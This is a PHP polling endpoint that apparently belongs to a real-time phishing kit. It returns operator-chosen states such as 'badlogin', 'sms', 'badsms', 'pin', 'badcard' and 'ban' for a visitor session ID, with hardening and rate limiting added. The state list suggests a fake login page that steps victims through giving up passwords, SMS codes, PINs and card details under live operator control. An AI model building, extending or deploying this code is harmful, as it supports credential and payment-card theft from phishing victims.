<?php
declare(strict_types=1);

require_once "../cors.php";
require_once './func.php';

/**
 * Security headers
 */
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

/**
 * Valid response types
 */
const VALID_RESPONSES = [
    'login', 'badlogin',
    'sms', 'badsms',
    'pin', 'badpin',
    'confirm', 'badcard',
    'app', 'mail', 'badmail',
    'custom', 'badcustom',
    'ban', 'unknown'
];

/**
 * Validate and sanitize ID parameter
 */
function validate_id(?string $id): ?string {
    if ($id === null || $id === '') {
        return null;
    }
    
    // Remove dangerous characters
    $id = htmlspecialchars(strip_tags($id), ENT_QUOTES, 'UTF-8');
    
    // Limit length to prevent abuse
    if (strlen($id) > 100) {
        return null;
    }
    
    return $id;
}

/**
 * Simple rate limiting
 */
function check_rate_limit(string $ip): bool {
    $cache_file = sys_get_temp_dir() . '/rate_limit_' . md5($ip);
    $max_requests = 100; // requests per minute
    $time_window = 60; // seconds
    
    if (file_exists($cache_file)) {
        $data = json_decode(file_get_contents($cache_file), true);
        if ($data === null) {
            $data = ['timestamp' => time(), 'count' => 1];
        } else {
            $time_diff = time() - $data['timestamp'];
            
            if ($time_diff < $time_window) {
                if ($data['count'] >= $max_requests) {
                    return false;
                }
                $data['count']++;
            } else {
                $data = ['timestamp' => time(), 'count' => 1];
            }
        }
    } else {
        $data = ['timestamp' => time(), 'count' => 1];
    }
    
    file_put_contents($cache_file, json_encode($data));
    return true;
}

/**
 * Send error response
 */
function send_error(int $http_code = 400): void {
    http_response_code($http_code);
    header('Content-Type: text/plain');
    echo 'error';
    exit();
}

/**
 * Main request handler
 */
function handle_request(): void {
    // Only accept GET requests
    if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
        send_error(405);
    }
    
    // Rate limiting
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    if (!check_rate_limit($client_ip)) {
        http_response_code(429);
        header('Content-Type: text/plain');
        echo 'too_many_requests';
        exit();
    }
    
    // Validate ID
    $id = validate_id($_GET['id'] ?? null);
    if ($id === null) {
        send_error(400);
    }
    
    // Get response from func.php
    try {
        $response = response($id);
        
        // Validate response
        if (!in_array($response, VALID_RESPONSES, true)) {
            $response = 'unknown';
        }
        
        // Send plain text response
        header('Content-Type: text/plain');
        echo $response;
        exit();
        
    } catch (Exception $e) {
        error_log("Processing error: " . $e->getMessage());
        send_error(500);
    }
}

// Execute main handler
handle_request();